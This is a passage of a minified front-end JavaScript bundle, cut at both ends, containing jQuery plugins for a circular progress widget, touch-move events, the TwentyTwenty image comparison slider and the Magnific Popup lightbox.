d=s[u],p=u/(s.length-1);t.isArray(d)&&(p=d[1],d=d[0]),h.addColorStop(p,d)}this.arcFill=h}}r.image&&(r.image instanceof Image?i=r.image:(i=new Image).src=r.image,i.complete?e():i.onload=e)},draw:function(){this.animation?this.drawAnimated(this.value):this.drawFrame(this.value)},drawFrame:function(t){this.lastFrameValue=t,this.ctx.clearRect(0,0,this.size,this.size),this.drawEmptyArc(t),this.drawArc(t)},drawArc:function(t){if(0!==t){var e=this.ctx,i=this.radius,n=this.getThickness(),r=this.startAngle;e.save(),e.beginPath(),this.reverse?e.arc(i,i,i-n/2,r-2*Math.PI*t,r):e.arc(i,i,i-n/2,r,r+2*Math.PI*t),e.lineWidth=n,e.lineCap=this.lineCap,e.strokeStyle=this.arcFill,e.stroke(),e.restore()}},drawEmptyArc:function(t){var e=this.ctx,i=this.radius,n=this.getThickness(),r=this.startAngle;t<1&&(e.save(),e.beginPath(),t<=0?e.arc(i,i,i-n/2,0,2*Math.PI):this.reverse?e.arc(i,i,i-n/2,r,r-2*Math.PI*t):e.arc(i,i,i-n/2,r+2*Math.PI*t,r),e.lineWidth=n,e.strokeStyle=this.emptyFill,e.stroke(),e.restore())},drawAnimated:function(e){var i=this,n=this.el,r=t(this.canvas);r.stop(!0,!1),n.trigger("circle-animation-start"),r.css({animationProgress:0}).animate({animationProgress:1},t.extend({},this.animation,{step:function(t){var r=i.animationStartValue*(1-t)+e*t;i.drawFrame(r),n.trigger("circle-animation-progress",[t,r])}})).promise().always((function(){n.trigger("circle-animation-end")}))},getThickness:function(){return t.isNumeric(this.thickness)?this.thickness:this.size/14},getValue:function(){return this.value},setValue:function(t){this.animation&&(this.animationStartValue=this.lastFrameValue),this.value=t,this.draw()}},t.circleProgress={defaults:e.prototype},t.easing.circleProgressEasing=function(t){return t<.5?.5*(t*=2)*t*t:1-.5*(t=2-2*t)*t*t},t.fn.circleProgress=function(i,n){var r="circle-progress",a=this.data(r);if("widget"==i){if(!a)throw Error('Calling "widget" method on not initialized instance is forbidden');return a.canvas}if("value"==i){if(!a)throw Error('Calling "value" method on not initialized instance is forbidden');if(void 0===n)return a.getValue();var o=arguments[1];return this.each((function(){t(this).data(r).setValue(o)}))}return this.each((function(){var n=t(this),a=n.data(r),o=t.isPlainObject(i)?i:{};if(a)a.init(o);else{var s=t.extend({},n.data());"string"==typeof s.fill&&(s.fill=JSON.parse(s.fill)),"string"==typeof s.animation&&(s.animation=JSON.parse(s.animation)),(o=t.extend(s,o)).el=n,a=new e(o),n.data(r,a)}}))}})),function(t){"function"==typeof define&&define.amd?define([],t):"undefined"!=typeof module&&null!==module&&module.exports?module.exports=t:t()}((function(){var t=Object.assign||window.jQuery&&jQuery.extend,e=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(t,e){return window.setTimeout((function(){t()}),25)};!function(){if("function"==typeof window.CustomEvent)return!1;function t(t,e){e=e||{bubbles:!1,cancelable:!1,detail:void 0};var i=document.createEvent("CustomEvent");return i.initCustomEvent(t,e.bubbles,e.cancelable,e.detail),i}t.prototype=window.Event.prototype,window.CustomEvent=t}();var i={textarea:!0,input:!0,select:!0,button:!0},n="mousemove",r="mouseup dragstart",a="mouseup",o="touchmove",s="touchend",l="touchend",c=/\s+/,h={bubbles:!0,cancelable:!0},u="function"==typeof Symbol?Symbol("events"):{};function d(t){return t[u]||(t[u]={})}function p(t,e,i,n,r){e=e.split(c);var a,o=d(t),s=e.length;function l(t){i(t,n)}for(;s--;)(o[a=e[s]]||(o[a]=[])).push([i,l]),t.addEventListener(a,l)}function f(t,e,i,n){e=e.split(c);var r,a,o,s=d(t),l=e.length;if(s)for(;l--;)if(a=s[r=e[l]])for(o=a.length;o--;)a[o][0]===i&&(t.removeEventListener(r,a[o][1]),a.splice(o,1))}function m(e,i,n){var r=function(t){return new CustomEvent(t,h)}(i);n&&t(r,n),e.dispatchEvent(r)}function g(t){var i=t,n=!1,r=!1;function a(t){n?(i(),e(a),r=!0,n=!1):r=!1}this.kick=function(t){n=!0,r||a()},this.end=function(t){var e=i;t&&(r?(i=n?function(){e(),t()}:t,n=!0):t())}}function v(){}function y(t){t.preventDefault()}function x(t,e){var i,n;if(t.identifiedTouch)return t.identifiedTouch(e);for(i=-1,n=t.length;++i<n;)if(t[i].identifier===e)return t[i]}function b(t,e){var i=x(t.changedTouches,e.identifier);if(i&&(i.pageX!==e.pageX||i.pageY!==e.pageY))return i}function w(t,e){T(t,e,t,M)}function _(t,e){M()}function M(){f(document,n,w),f(document,r,_)}function S(t){f(document,o,t.touchmove),f(document,s,t.touchend)}function T(t,e,i,n){var r=i.pageX-e.pageX,a=i.pageY-e.pageY;r*r+a*a<64||function(t,e,i,n,r,a){var o=t.targetTouches,s=t.timeStamp-e.timeStamp,l={altKey:t.altKey,ctrlKey:t.ctrlKey,shiftKey:t.shiftKey,startX:e.pageX,startY:e.pageY,distX:n,distY:r,deltaX:n,deltaY:r,pageX:i.pageX,pageY:i.pageY,velocityX:n/s,velocityY:r/s,identifier:e.identifier,targetTouches:o,finger:o?o.length:1,enableMove:function(){this.moveEnabled=!0,this.enableMove=v,t.preventDefault()}};m(e.target,"movestart",l),a(e)}(t,e,i,r,a,n)}function E(t,e){var i=e.timer;e.touch=t,e.timeStamp=t.timeStamp,i.kick()}function C(t,e){var i=e.target,r=e.event,o=e.timer;f(document,n,E),f(document,a,C),A(i,r,o,(function(){setTimeout((function(){f(i,"click",y)}),0)}))}function A(t,e,i,n){i.end((function(){return m(t,"moveend",e),n&&n()}))}if(p(document,"mousedown",(function(t){(function(t){return 1===t.which&&!t.ctrlKey&&!t.altKey})(t)&&(function(t){return!!i[t.target.tagName.toLowerCase()]}(t)||(p(document,n,w,t),p(document,r,_,t)))})),p(document,"touchstart",(function(t){if(!i[t.target.tagName.toLowerCase()]){var e=t.changedTouches[0],n={target:e.target,pageX:e.pageX,pageY:e.pageY,identifier:e.identifier,touchmove:function(t,e){!function(t,e){var i=b(t,e);i&&T(t,e,i,S)}(t,e)},touchend:function(t,e){!function(t,e){x(t.changedTouches,e.identifier)&&S(e)}(t,e)}};p(document,o,n.touchmove,n),p(document,s,n.touchend,n)}})),p(document,"movestart",(function(t){if(!t.defaultPrevented&&t.moveEnabled){var e={startX:t.startX,startY:t.startY,pageX:t.pageX,pageY:t.pageY,distX:t.distX,distY:t.distY,deltaX:t.deltaX,deltaY:t.deltaY,velocityX:t.velocityX,velocityY:t.velocityY,identifier:t.identifier,targetTouches:t.targetTouches,finger:t.finger},i={target:t.target,event:e,timer:new g((function(t){(function(t,e,i){var n=i-t.timeStamp;t.distX=e.pageX-t.startX,t.distY=e.pageY-t.startY,t.deltaX=e.pageX-t.pageX,t.deltaY=e.pageY-t.pageY,t.velocityX=.3*t.velocityX+.7*t.deltaX/n,t.velocityY=.3*t.velocityY+.7*t.deltaY/n,t.pageX=e.pageX,t.pageY=e.pageY})(e,i.touch,i.timeStamp),m(i.target,"move",e)})),touch:void 0,timeStamp:t.timeStamp};void 0===t.identifier?(p(t.target,"click",y),p(document,n,E,i),p(document,a,C,i)):(i.activeTouchmove=function(t,e){!function(t,e){var i=e.event,n=e.timer,r=b(t,i);r&&(t.preventDefault(),i.targetTouches=t.targetTouches,e.touch=r,e.timeStamp=t.timeStamp,n.kick())}(t,e)},i.activeTouchend=function(t,e){!function(t,e){var i=e.target,n=e.event,r=e.timer;x(t.changedTouches,n.identifier)&&(function(t){f(document,o,t.activeTouchmove),f(document,l,t.activeTouchend)}(e),A(i,n,r))}(t,e)},p(document,o,i.activeTouchmove,i),p(document,l,i.activeTouchend,i))}})),window.jQuery){var L="startX startY pageX pageY distX distY deltaX deltaY velocityX velocityY".split(" ");jQuery.event.special.movestart={setup:function(){return p(this,"movestart",P),!1},teardown:function(){return f(this,"movestart",P),!1},add:I},jQuery.event.special.move={setup:function(){return p(this,"movestart",R),!1},teardown:function(){return f(this,"movestart",R),!1},add:I},jQuery.event.special.moveend={setup:function(){return p(this,"movestart",O),!1},teardown:function(){return f(this,"movestart",O),!1},add:I}}function P(t){t.enableMove()}function R(t){t.enableMove()}function O(t){t.enableMove()}function I(t){var e=t.handler;t.handler=function(t){for(var i,n=L.length;n--;)t[i=L[n]]=t.originalEvent[i];e.apply(this,arguments)}}})),function(t){t.fn.twentytwenty=function(e){return e=t.extend({default_offset_pct:.5,orientation:"horizontal",before_label:"Before",after_label:"After",no_overlay:!1,move_slider_on_hover:!1,move_with_handle_only:!0,click_to_move:!1},e),this.each((function(){var i=e.default_offset_pct,n=t(this),r=e.orientation,a="vertical"===r?"down":"left",o="vertical"===r?"up":"right";if(n.wrap("<div class='twentytwenty-wrapper twentytwenty-"+r+"'></div>"),!e.no_overlay){n.append("<div class='twentytwenty-overlay'></div>");var s=n.find(".twentytwenty-overlay");s.append("<div class='twentytwenty-before-label' data-content='"+e.before_label+"'></div>"),s.append("<div class='twentytwenty-after-label' data-content='"+e.after_label+"'></div>")}var l=n.find("img:first"),c=n.find("img:last");n.append("<div class='twentytwenty-handle'></div>");var h=n.find(".twentytwenty-handle");h.append("<span class='twentytwenty-"+a+"-arrow'></span>"),h.append("<span class='twentytwenty-"+o+"-arrow'></span>"),n.addClass("twentytwenty-container"),l.addClass("twentytwenty-before"),c.addClass("twentytwenty-after");var u=function(t){var e,i,a,o=(e=t,{w:(i=l.width())+"px",h:(a=l.height())+"px",cw:e*i+"px",ch:e*a+"px"});h.css("vertical"===r?"top":"left","vertical"===r?o.ch:o.cw),function(t){"vertical"===r?(l.css("clip","rect(0,"+t.w+","+t.ch+",0)"),c.css("clip","rect("+t.ch+","+t.w+","+t.h+",0)")):(l.css("clip","rect(0,"+t.cw+","+t.h+",0)"),c.css("clip","rect(0,"+t.w+","+t.h+","+t.cw+")")),n.css("height",t.h)}(o)},d=function(t,e){var i;return i="vertical"===r?(e-f)/g:(t-p)/m,0,1,Math.max(0,Math.min(1,i))};t(window).on("resize.twentytwenty",(function(t){u(i)}));var p=0,f=0,m=0,g=0,v=function(t){((t.distX>t.distY&&t.distX<-t.distY||t.distX<t.distY&&t.distX>-t.distY)&&"vertical"!==r||(t.distX<t.distY&&t.distX<-t.distY||t.distX>t.distY&&t.distX>-t.distY)&&"vertical"===r)&&t.preventDefault(),n.addClass("active"),p=n.offset().left,f=n.offset().top,m=l.width(),g=l.height()},y=function(t){n.hasClass("active")&&(i=d(t.pageX,t.pageY),u(i))},x=function(){n.removeClass("active")},b=e.move_with_handle_only?h:n;b.on("movestart",v),b.on("move",y),b.on("moveend",x),e.move_slider_on_hover&&(n.on("mouseenter",v),n.on("mousemove",y),n.on("mouseleave",x)),h.on("touchmove",(function(t){t.preventDefault()})),n.find("img").on("mousedown",(function(t){t.preventDefault()})),e.click_to_move&&n.on("click",(function(t){p=n.offset().left,f=n.offset().top,m=l.width(),g=l.height(),i=d(t.pageX,t.pageY),u(i)})),t(window).trigger("resize.twentytwenty")}))}}(jQuery),function(t){"function"==typeof define&&define.amd?define(["jquery"],t):t("object"==typeof exports?require("jquery"):window.jQuery||window.Zepto)}((function(t){var e,i,n,r,a,o,s="Close",l="BeforeClose",c="MarkupParse",h="Open",u="Change",d="mfp",p="."+d,f="mfp-ready",m="mfp-removing",g="mfp-prevent-close",v=function(){},y=!!window.jQuery,x=t(window),b=function(t,i){e.ev.on(d+t+p,i)},w=function(e,i,n,r){var a=document.createElement("div");return a.className="mfp-"+e,n&&(a.innerHTML=n),r?i&&i.appendChild(a):(a=t(a),i&&a.appendTo(i)),a},_=function(i,n){e.ev.triggerHandler(d+i,n),e.st.callbacks&&(i=i.charAt(0).toLowerCase()+i.slice(1),e.st.callbacks[i]&&e.st.callbacks[i].apply(e,t.isArray(n)?n:[n]))},M=function(i){return i===o&&e.currTemplate.closeBtn||(e.currTemplate.closeBtn=t(e.st.closeMarkup.replace("%title%",e.st.tClose)),o=i),e.currTemplate.closeBtn},S=function(){t.magnificPopup.instance||((e=new v).init(),t.magnificPopup.instance=e)};v.prototype={constructor:v,init:function(){var i=navigator.appVersion;e.isLowIE=e.isIE8=document.all&&!document.addEventListener,e.isAndroid=/android/gi.test(i),e.isIOS=/iphone|ipad|ipod/gi.test(i),e.supportsTransition=function(){var t=document.createElement("p").style,e=["ms","O","Moz","Webkit"];if(void 0!==t.transition)return!0;for(;e.length;)if(e.pop()+"Transition"in t)return!0;return!1}(),e.probablyMobile=e.isAndroid||e.isIOS||/(Opera Mini)|Kindle|webOS|BlackBerry|(Opera Mobi)|(Windows Phone)|IEMobile/i.test(navigator.userAgent),n=t(document),e.popupsCache={}},open:function(i){var r;if(!1===i.isObj){e.items=i.items.toArray(),e.index=0;var o,s=i.items;for(r=0;r<s.length;r++)if((o=s[r]).parsed&&(o=o.el[0]),o===i.el[0]){e.index=r;break}}else e.items=t.isArray(i.items)?i.items:[i.items],e.index=i.index||0;if(!e.isOpen){e.types=[],a="",i.mainEl&&i.mainEl.length?e.ev=i.mainEl.eq(0):e.ev=n,i.key?(e.popupsCache[i.key]||(e.popupsCache[i.key]={}),e.currTemplate=e.popupsCache[i.key]):e.currTemplate={},e.st=t.extend(!0,{},t.magnificPopup.defaults,i),e.fixedContentPos="auto"===e.st.fixedContentPos?!e.probablyMobile:e.st.fixedContentPos,e.st.modal&&(e.st.closeOnContentClick=!1,e.st.closeOnBgClick=!1,e.st.showCloseBtn=!1,e.st.enableEscapeKey=!1),e.bgOverlay||(e.bgOverlay=w("bg").on("click"+p,(function(){e.close()})),e.wrap=w("wrap").attr("tabindex",-1).on("click"+p,(function(t){e._checkIfClose(t.target)&&e.close()})),e.container=w("container",e.wrap)),e.contentContainer=w("content"),e.st.preloader&&(e.preloader=w("preloader",e.container,e.st.tLoading));var l=t.magnificPopup.modules;for(r=0;r<l.length;r++){var u=l[r];u=u.charAt(0).toUpperCase()+u.slice(1),e["init"+u].call(e)}_("BeforeOpen"),e.st.showCloseBtn&&(e.st.closeBtnInside?(b(c,(function(t,e,i,n){i.close_replaceWith=M(n.type)})),a+=" mfp-close-btn-in"):e.wrap.append(M())),e.st.alignTop&&(a+=" mfp-align-top"),e.fixedContentPos?e.wrap.css({overflow:e.st.overflowY,overflowX:"hidden",overflowY:e.st.overflowY}):e.wrap.css({top:x.scrollTop(),position:"absolute"}),(!1===e.st.fixedBgPos||"auto"===e.st.fixedBgPos&&!e.fixedContentPos)&&e.bgOverlay.css({height:n.height(),position:"absolute"}),e.st.enableEscapeKey&&n.on("keyup"+p,(function(t){27===t.keyCode&&e.close()})),x.on("resize"+p,(function(){e.updateSize()})),e.st.closeOnContentClick||(a+=" mfp-auto-cursor"),a&&e.wrap.addClass(a);var d=e.wH=x.height(),m={};if(e.fixedContentPos&&e._hasScrollBar(d)){var g=e._getScrollbarSize();g&&(m.marginRight=g)}e.fixedContentPos&&(e.isIE7?t("body, html").css("overflow","hidden"):m.overflow="hidden");var v=e.st.mainClass;return e.isIE7&&(v+=" mfp-ie7"),v&&e._addClassToMFP(v),e.updateItemHTML(),_("BuildControls"),t("html").css(m),e.bgOverlay.add(e.wrap).prependTo(e.st.prependTo||t(document.body)),e._lastFocusedEl=document.activeElement,setTimeout((function(){e.content?(e._addClassToMFP(f),e._setFocus()):e.bgOverlay.addClass(f),n.on("focusin"+p,e._onFocusIn)}),16),e.isOpen=!0,e.updateSize(d),_(h),i}e.updateItemHTML()},close:function(){e.isOpen&&(_(l),e.isOpen=!1,e.st.removalDelay&&!e.isLowIE&&e.supportsTransition?(e._addClassToMFP(m),setTimeout((function(){e._close()}),e.st.removalDelay)):e._close())},_close:function(){_(s);var i=m+" "+f+" ";if(e.bgOverlay.detach(),e.wrap.detach(),e.container.empty(),e.st.mainClass&&(i+=e.st.mainClass+" "),e._removeClassFromMFP(i),e.fixedContentPos){var r={marginRight:""};e.isIE7?t("body, html").css("overflow",""):r.overflow="",t("html").css(r)}n.off("keyup.mfp focusin"+p),e.ev.off(p),e.wrap.attr("class","mfp-wrap").removeAttr("style"),e.bgOverlay.attr("class","mfp-bg"),e.container.attr("class","mfp-container"),!e.st.showCloseBtn||e.st.closeBtnInside&&!0!==e.currTemplate[e.currItem.type]||e.currTemplate.closeBtn&&e.currTemplate.closeBtn.detach(),e.st.autoFocusLast&&e._lastFocusedEl&&t(e._lastFocusedEl).focus(),e.currItem=null,e.content=null,e.currTemplate=null,e.prevHeight=0,_("AfterClose")},updateSize:function(t){if(e.isIOS){var i=document.documentElement.clientWidth/window.innerWidth,n=window.innerHeight*i;e.wrap.css("height",n),e.wH=n}else e.wH=t||x.height();e.fixedContentPos||e.wrap.css("height",e.wH),_("Resize")},updateItemHTML:function(){var i=e.items[e.index];e.contentContainer.detach(),e.content&&e.content.detach(),i.parsed||(i=e.parseEl(e.index));var n=i.type;if(_("BeforeChange",[e.currItem?e.currItem.type:"",n]),e.currItem=i,!e.currTemplate[n]){var a=!!e.st[n]&&e.st[n].markup;_("FirstMarkupParse",a),e.currTemplate[n]=!a||t(a)}r&&r!==i.type&&e.container.removeClass("mfp-"+r+"-holder");var o=e["get"+n.charAt(0).toUpperCase()+n.slice(1)](i,e.currTemplate[n]);e.appendContent(o,n),i.preloaded=!0,_(u,i),r=i.type,e.container.prepend(e.contentContainer),_("AfterChange")},appendContent:function(t,i){e.content=t,t?e.st.showCloseBtn&&e.st.closeBtnInside&&!0===e.currTemplate[i]?e.content.find(".mfp-close").length||e.content.append(M()):e.content=t:e.content="",_("BeforeAppend"),e.container.addClass("mfp-"+i+"-holder"),e.contentContainer.append(e.content)},parseEl:function(i){var n,r=e.items[i];if(r.tagName?r={el:t(r)}:(n=r.type,r={data:r,src:r.src}),r.el){for(var a=e.types,o=0;o<a.length;o++)if(r.el.hasClass("mfp-"+a[o])){n=a[o];break}r.src=r.el.attr("data-mfp-src"),r.src||(r.src=r.el.attr("href"))}return r.type=n||e.st.type||"inline",r.index=i,r.parsed=!0,e.items[i]=r,_("ElementParse",r),e.items[i]},addGroup:function(t,i){var n=function(n){n.mfpEl=this,e._openClick(n,t,i)};i||(i={});var r="click.magnificPopup";i.mainEl=t,i.items?(i.isObj=!0,t.off(r).on(r,n)):(i.isObj=!1,i.delegate?t.off(r).on(r,i.delegate,n):(i.items=t,t.off(r).on(r,n)))},_openClick:function(i,n,r){if((void 0!==r.midClick?r.midClick:t.magnificPopup.defaults.midClick)||!(2===i.which||i.ctrlKey||i.metaKey||i.altKey||i.shiftKey)){var a=void 0!==r.disableOn?r.disableOn:t.magnificPopup.defaults.disableOn;if(a)if(t.isFunction(a)){if(!a.call(e))return!0}else if(x.width()<a)return!0;i.type&&(i.preventDefault(),e.isOpen&&i.stopPropagation()),r.el=t(i.mfpEl),r.delegate&&(r.items=n.find(r.delegate)),e.open(r)}},updateStatus:function(t,n){if(e.preloader){i!==t&&e.container.removeClass("mfp-s-"+i),n||"loading"!==t||(n=e.st.tLoading);var r={status:t,text:n};_("UpdateStatus",r),t=r.status,n=r.text,e.preloader.html(n),e.preloader.find("a").on("click",(function(t){t.stopImmediatePropagation()})),e.container.addClass("mfp-s-"+t),i=t}},_checkIfClose:function(i){if(!t(i).hasClass(g)){var n=e.st.closeOnContentClick,r=e.st.closeOnBgClick;if(n&&r)return!0;if(!e.content||t(i).hasClass("mfp-close")||e.preloader&&i===e.preloader[0])return!0;if(i===e.content[0]||t.contains(e.content[0],i)){if(n)return!0}else if(r&&t.contains(document,i))return!0;return!1}},_addClassToMFP:function(t){e.bgOverlay.addClass(t),e.wrap.addClass(t)},_removeClassFromMFP:function(t){this.bgOverlay.removeClass(t),e.wrap.removeClass(t)},_hasScrollBar:function(t){return(e.isIE7?n.height():document.body.scrollHeight)>(t||x.height())},_setFocus:function(){(e.st.focus?e.content.find(e.st.focus).eq(0):e.wrap).focus()},_onFocusIn:function(i){return i.target===e.wrap[0]||t.contains(e.wrap[0],i.target)?void 0:(e._setFocus(),!1)},_parseMarkup:function(e,i,n){var r;n.data&&(i=t.extend(n.data,i)),_(c,[e,i,n]),t.each(i,(function(i,n){if(void 0===n||!1===n)return!0;if((r=i.split("_")).length>1){var a=e.find(p+"-"+r[0]);if(a.length>0){var o=r[1];"replaceWith"===o?a[0]!==n[0]&&a.replaceWith(n):"img"===o?a.is("img")?a.attr("src",n):a.replaceWith(t("<img>").attr("src",n).attr("class",a.attr("class"))):a.attr(r[1],n)}}else e.find(p+"-"+i).html(n)}))},_getScrollbarSize:function(){if(void 0===e.scrollbarSize){var t=document.createElement("div");t.style.cssText="width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;",document.body.appendChild(t),e.scrollbarSize=t.offsetWidth-t.clientWidth,document.body.removeChild(t)}return e.scrollbarSize}},t.magnificPopup={instance:null,proto:v.prototype,modules:[],open:function(e,i){return S(),(e=e?t.extend(!0,{},e):{}).isObj=!0,e.index=i||0,this.instance.open(e)},close:function(){return t.magnificPopup.instance&&t.magnificPopup.instance.close()},registerModule:function(e,i){i.options&&(t.magnificPopup.defaults[e]=i.options),t.extend(this.proto,i.proto),this.modules.push(e)},defaults:{disableOn:0,key:null,midClick:!1,mainClass:"",preloader:!0,focus:"",closeOnContentClick:!1,closeOnBgClick:!0,closeBtnInside:!0,showCloseBtn:!0,enableEscapeKey:!0,modal:!1,alignTop:!1,removalDelay:0,prependTo:null,fixedContentPos:"auto",fixedBgPos:"auto",overflowY:"auto",closeMarkup:'<button title="%title%" type="button" class="mfp-close">&#215;</button>',tClose:"Close (Esc)",tLoading:"Loading...",autoFocusLast:!0}},t.fn.magnificPopup=function(i){S();var n=t(this);if("string"==typeof i)if("open"===i){var r,a=y?n.data("magnificPopup"):n[0].magnificPopup,o=parseInt(arguments[1],10)||0;a.items?r=a.items[o]:(r=n,a.delegate&&(r=r.find(a.delegate)),r=r.eq(o)),e._openClick({mfpEl:r},n,a)}else e.isOpen&&e[i].apply(e,Array.prototype.slice.call(arguments,1));else i=t.extend(!0,{},i),y?n.data("magnificPopup",i):n[0].magnificPopup=i,e.addGroup(n,i);return n};var T,E,C,A="inline",L=function(){C&&(E.after(C.addClass(T)).detach(),C=null)};t.magnificPopup.registerModule(A,{options:{hiddenClass:"hide",markup:"",tNotFound:"Content not found"},proto:{initInline:function(){e.types.push(A),b(s+"."+A,(function(){L()}))},getInline:function(i,n){if(L(),i.src){var r=e.st.inline,a=t(i.src);if(a.length){var o=a[0].parentNode;o&&o.tagName&&(E||(T=r.hiddenClass,E=w(T),T="mfp-"+T),C=a.after(E).detach().removeClass(T)),e.updateStatus("ready")}else e.updateStatus("error",r.tNotFound),a=t("<div>");return i.inlineElement=a,a}return e.updateStatus("ready"),e._parseMarkup(n,{},i),n}}});var P,R="ajax",O=function(){P&&t(document.body).removeClass(P)},I=function(){O(),e.req&&e.req.abort()};t.magnificPopup.registerModule(R,{options:{settings:null,cursor:"mfp-ajax-cur",tError:'<a href="%url%">The content</a> could not be loaded.'},proto:{initAjax:function(){e.types.push(R),P=e.st.ajax.cursor,b(s+"."+R,I),b("BeforeChange."+R,I)},getAjax:function(i){P&&t(document.body).addClass(P),e.updateStatus("loading");var n=t.extend({url:i.src,success:function(n,r,a){var o={data:n,xhr:a};_("ParseAjax",o),e.appendContent(t(o.data),R),i.finished=!0,O(),e._setFocus(),setTimeout((function(){e.wrap.addClass(f)}),16),e.updateStatus("ready"),_("AjaxContentAdded")},error:function(){O(),i.finished=i.loadError=!0,e.updateStatus("error",e.st.ajax.tError.replace("%url%",i.src))}},e.st.ajax.settings);return e.req=t.ajax(n),""}}});var z,D=function(i){if(i.data&&void 0!==i.data.title)return i.data.title;var n=e.st.image.titleSrc;if(n){if(t.isFunction(n))return n.call(e,i);if(i.el)return i.el.attr(n)||""}return""};t.magnificPopup.registerModule("image",{options:{markup:'<div class="mfp-figure"><div class="mfp-close"></div><figure><div class="mfp-img"></div><figcaption><div class="mfp-bottom-bar"><div class="mfp-title"></div><div class="mfp-counter"></div></div></figcaption></figure></div>',cursor:"mfp-zoom-out-cur",titleSrc:"title",verticalFit:!0,tError:'<a href="%url%">The image</a> could not be loaded.'},proto:{initImage:function(){var i=e.st.image,n=".image";e.types.push("image"),b(h+n,(function(){"image"===e.currItem.type&&i.cursor&&t(document.body).addClass(i.cursor)})),b(s+n,(function(){i.cursor&&t(document.body).removeClass(i.cursor),x.off("resize"+p)})),b("Resize"+n,e.resizeImage),e.isLowIE&&b("AfterChange",e.resizeImage)},resizeImage:function(){var t=e.currItem;if(t&&t.img&&e.st.image.verticalFit){var i=0;e.isLowIE&&(i=parseInt(t.img.css("padding-top"),10)+parseInt(t.img.css("padding-bottom"),10)),t.img.css("max-height",e.wH-i)}},_onImageHasSize:function(t){t.img&&(t.hasSize=!0,z&&clearInterval(z),t.isCheckingImgSize=!1,_("ImageHasSize",t),t.imgHidden&&(e.content&&e.content.removeClass("mfp-loading"),t.imgHidden=!1))},findImageSize:function(t){var i=0,n=t.img[0],r=function(a){z&&clearInterval(z),z=setInterval((function(){return n.naturalWidth>0?void e._onImageHasSize(t):(i>200&&clearInterval(z),void(3===++i?r(10):40===i?r(50):100===i&&r(500)))}),a)};r(1)},getImage:function(i,n){var r=0,a=function(){i&&(i.img[0].complete?(i.img.off(".mfploader"),i===e.currItem&&(e._onImageHasSize(i),e.updateStatus("ready")),i.hasSize=!0,i.loaded=!0,_("ImageLoadComplete")):200>++r?setTimeout(a,100):o())},o=function(){i&&(i.img.off(".mfploader"),i===e.currItem&&(e._onImageHasSize(i),e.updateStatus("error",s.tError.replace("%url%",i.src))),i.hasSize=!0,i.loaded=!0,i.loadError=!0)},s=e.st.image,l=n.find(".mfp-img");if(l.length){var c=document.createElement("img");c.className="mfp-img",i.el&&i.el.find("img").length&&(c.alt=i.el.find("img").attr("alt")),i.img=t(c).on("load.mfploader",a).on("error.mfploader",o),c.src=i.src,l.is("img")&&(i.img=i.img.clone()),(c=i.img[0]).naturalWidth>0?i.hasSize=!0:c.width||(i.hasSize=!1)}return e._parseMarkup(n,{title:D(i),img_replaceWith:i.img},i),e.resizeImage(),i.hasSize?(z&&clearInterval(z),i.loadError?(n.addClass("mfp-loading"),e.updateStatus("error",s.tError.replace("%url%",i.src))):(n.removeClass("mfp-loading"),e.updateStatus("ready")),n):(e.updateStatus("loading"),i.loading=!0,i.hasSize||(i.imgHidden=!0,n.addClass("mfp-loading"),e.findImageSize(i)),n)}}});var N;t.magnificPopup.registerModule("zoom",{options:{enabled:!1,easing:"ease-in-out",duration:300,opener:function(t){return t.is("img")?t:t.find("img")}},proto:{initZoom:function(){var t,i=e.st.zoom,n=".zoom";if(i.enabled&&e.supportsTransition){var r,a,o=i.duration,c=function(t){var e=t.clone().removeAttr("style").removeAttr("class").addClass("mfp-animated-image"),n="all "+i.duration/1e3+"s "+i.easing,r={position:"fixed",zIndex:9999,left:0,top:0,"-webkit-backface-visibility":"hidden"},a="transition";return r["-webkit-"+a]=r["-moz-"+a]=r["-o-"+a]=r[a]=n,e.css(r),e},h=function(){e.content.css("visibility","visible")};b("BuildControls"+n,(function(){if(e._allowZoom()){if(clearTimeout(r),e.content.css("visibility","hidden"),!(t=e._getItemToZoom()))return void h();(a=c(t)).css(e._getOffset()),e.wrap.append(a),r=setTimeout((function(){a.css(e._getOffset(!0)),r=setTimeout((function(){h(),setTimeout((function(){a.remove(),t=a=null,_("ZoomAnimationEnded")}),16)}),o)}),16)}})),b(l+n,(function(){if(e._allowZoom()){if(clearTimeout(r),e.st.removalDelay=o,!t){if(!(t=e._getItemToZoom()))return;a=c(t)}a.css(e._getOffset(!0)),e.wrap.append(a),e.content.css("visibility","hidden"),setTimeout((function(){a.css(e._getOffset())}),16)}})),b(s+n,(function(){e._allowZoom()&&(h(),a&&a.remove(),t=null)}))}},_allowZoom:function(){return"image"===e.currItem.type},_getItemToZoom:function(){return!!e.currItem.hasSize&&e.currItem.img},_getOffset:function(i){var n,r=(n=i?e.currItem.img:e.st.zoom.opener(e.currItem.el||e.currItem)).offset(),a=parseInt(n.css("padding-top"),10),o=parseInt(n.css("padding-bottom"),10);r.top-=t(window).scrollTop()-a;var s={width:n.width(),height:(y?n.innerHeight():n[0].offsetHeight)-o-a};return void 0===N&&(N=void 0!==document.createElement("p").style.MozTransform),N?s["-moz-transform"]=s.transform="translate("+r.left+"px,"+r.top+"px)":(s.left=r.left,s.top=r.top),s}}});var k="iframe",B=function(t){if(e.currTemplate[k]){var i=e.currTemplate[k].find("iframe");i.length&&(t||(i[0].src="//about:blank"),e.isIE8&&i.css("display",t?"block":"none"))}};t.magnificPopup.registerModule(k,{options:{markup:'<div class="mfp-iframe-scaler"><div class="mfp-close"></div><iframe class="mfp-iframe" src="//about:blank" frameborder="0" allowfullscreen></iframe></div>',srcAction:"iframe_src",patterns:{youtube:{index:"youtube.com",id:"v=",src:"//www.youtube.com/embed/%id%?autoplay=1"},vimeo:{index:"vimeo.com/",id:"/",src:"//player.vimeo.com/video/%id%?autoplay=1"},gmaps:{index:"//maps.google.",src:"%id%&output=embed"}}},proto:{initIframe:function(){e.types.push(k),b("BeforeChange",(function(t,e,i){e!==i&&(e===k?B():i===k&&B(!0))})),b(s+"."+k,(function(){B()}))},getIframe:function(i,n){var r=i.src,a=e.st.iframe;t.each(a.patterns,(function(){return r.indexOf(this.index)>-1?(this.id&&(r="string"==typeof this.id?r.substr(r.lastIndexOf(this.id)+this.id.length,r.length):this.id.call(this,r)),r=this.src.replace("%id%",r),!1):void 0}));var o={};return a.srcAction&&(o[a.srcAction]=r),e._parseMarkup(n,o,i),e.updateStatus("ready"),n}}});var F=function(t){var i=e.items.length;return t>i-1?t-i:0>t?i+t:t},H=function(t,e,i){return 